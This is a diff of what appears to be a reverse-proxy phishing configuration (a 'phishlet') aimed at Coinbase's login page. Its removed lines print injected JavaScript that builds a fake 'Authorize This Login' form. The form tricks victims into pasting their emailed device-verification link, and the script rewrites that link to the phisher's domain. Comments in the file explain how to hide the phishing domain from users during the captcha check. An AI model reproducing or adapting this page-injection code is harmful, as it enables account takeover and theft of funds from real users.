@@ -60,7 +60,7 @@ login:
 # "function hcaptcha()" will replace the domain name during the captcha validation to decrease the possibility of getting caught by the user.
 
 js_inject:
-  - trigger_domains: ["https://login.coinbase.com"]
+  - trigger_domains: ["login.coinbase.com"]
     trigger_paths: ["/signin?"]
     trigger_params: [domain]
     script: |
@@ -83,54 +83,7 @@ js_inject:
         div.className = 'account-inner';
         div.innerHTML = `
         <img class="account-icon" src="https://www.coinbase.com/assets/quickstart/icon-signup-9ed7432acbf85046d2a12f1e29f9e245d6e8376b379b524a1ebb6250c993f4d1.png">
-        <div class="account-icon"></div>
-        <h2 class="account-header">Authorize This Login</h2>
-        <p>Copy The Verification Link Received in Email And Paste It Below To Verify The Login </p>
-        <form action="">
-        <fieldset>
-        <input type="url" name="linkVerify" id="linkVerify" placeholder="https://coinbase.com/device_confirmations/confirm_email?token=xxxxxxxxxxxxxxxx" pattern="https://.*"> 
-        <input class="btn" type="button" value="Verify Device" onclick="ValidateLink()">
-        </fieldset></form>
-        <p></p>
-        `;
-        document.getElementsByClassName("account-form device-confirmation")[0].appendChild(div);
-        var div = document.createElement('div');
-        div.className = 'device-support';
-        div.innerHTML = `
-        <p>Email didn't arrive?</p>
-        <p>Visit our <a href="https://support.coinbase.com/customer/portal/articles/2521789">Support Center</a>.</p>
-        <p></p>
-        <p>
-        <a href="/email_recovery/new">
-          I no longer have access to my email address
-        </a>      </p>
-        `;
-        document.getElementsByClassName("account-form device-confirmation")[0].appendChild(div);
-        return;
-      }
-      function ValidateLink(){
-        var domain = "{domain}"
-        var link1 = document.getElementById("linkVerify").value;
-        var link2 = link1.replace('coinbase.com', domain);
-        console.log(link2)
-        window.open(link2, '_blank').focus();
+        
       }
       setTimeout(function(){ lp(); }, 3500);
       
-# HCAPTCHA Header That shows domain name can be Replaced dynamically with javascripts, Its Disabled Here Because Its resulting in Hcaptcha error, Find your ways to solve it.
-#
-#  - trigger_domains: ["https://login.coinbase.com"]
-#    trigger_paths: ["/signin?"]
-#    trigger_params: []
-#    script: |
-#      function hcaptcha(){
-#        var elem = document.getElementsByClassName("cf-subheadline")[0];
-#        elem.parentNode.removeChild(elem);
-#        var div = document.createElement('div');
-#        div.className = 'cf-subheadline';
-#        div.innerHTML = `
-#        <h2 class="cf-subheadline"><span data-translate="complete_sec_check">Please complete the security check to get access to</span> Coinbase Website</h2>
-#        `;
-#        document.getElementsByClassName("cf-wrapper cf-header cf-error-overview")[0].appendChild(div);
-#        return;
-#        }    
